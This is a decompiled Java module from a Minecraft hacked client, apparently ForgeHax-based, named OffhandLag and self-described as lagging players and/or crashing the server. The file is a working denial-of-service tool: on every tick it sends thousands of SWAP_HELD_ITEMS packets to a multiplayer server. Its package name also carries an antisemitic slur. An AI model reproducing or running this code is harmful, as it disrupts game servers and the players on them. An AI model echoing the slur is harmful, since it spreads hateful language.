//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\Admin\Desktop\Minecraft-Deobfuscator3000-1.2.2\1.12 stable mappings"!

//Decompiled by Procyon!

package fuck.you.jewtricks.modules.misc;

import com.matt.forgehax.util.mod.loader.*;
import com.matt.forgehax.util.mod.*;
import com.matt.forgehax.util.command.*;
import fuck.you.jewtricks.events.*;
import fuck.you.jewtricks.base.*;
import net.minecraft.init.*;
import net.minecraft.network.play.client.*;
import net.minecraft.util.*;
import net.minecraft.network.*;
import net.minecraftforge.fml.common.eventhandler.*;

@RegisterMod
public class OffhandLag extends ToggleMod
{
    private Setting<Integer> speed;
    private Setting<Boolean> disabledeath;
    
    public OffhandLag() {
        super(Category.MISC, "OffhandLag", false, "Lags players and/or crashes the server");
        this.speed = (Setting<Integer>)((SettingBuilder)((SettingBuilder)this.getCommandStub().builders().newSettingBuilder().name("speed")).description("Amount of item hand swaps per tick")).defaultTo((Object)2000).min((Object)1).max((Object)5000).build();
        this.disabledeath = (Setting<Boolean>)((SettingBuilder)((SettingBuilder)this.getCommandStub().builders().newSettingBuilder().name("disabledeath")).description("Disable on death")).defaultTo((Object)false).build();
    }
    
    @SubscribeEvent
    public void onUpdate(final PlayerUpdateEvent event) {
        if (Wrapper.getMinecraft().getCurrentServerData() == null) {
            Wrapper.printChat("Disabling OffhandLag because it doesn't work in singleplayer");
            this.disable();
            return;
        }
        if ((boolean)this.disabledeath.get() && (Wrapper.getLocalPlayer().isDead || Wrapper.getLocalPlayer().getHealth() <= 0.0f)) {
            Wrapper.printChat("Disabling OffhandLag because you died");
            this.disable();
            return;
        }
        if (Wrapper.getLocalPlayer().getHeldItemMainhand() == null || Wrapper.getLocalPlayer().getHeldItemMainhand().getItem().equals(Items.AIR) || Wrapper.getLocalPlayer().getHeldItemOffhand() == null || Wrapper.getLocalPlayer().getHeldItemOffhand().getItem().equals(Items.AIR)) {
            return;
        }
        for (int i = 0; i < (int)this.speed.get(); ++i) {
            final CPacketPlayerDigging packet = new CPacketPlayerDigging(CPacketPlayerDigging.Action.SWAP_HELD_ITEMS, Wrapper.getLocalPlayer().getPosition(), EnumFacing.UP);
            Wrapper.getLocalPlayer().connection.sendPacket((Packet)packet);
        }
    }
}
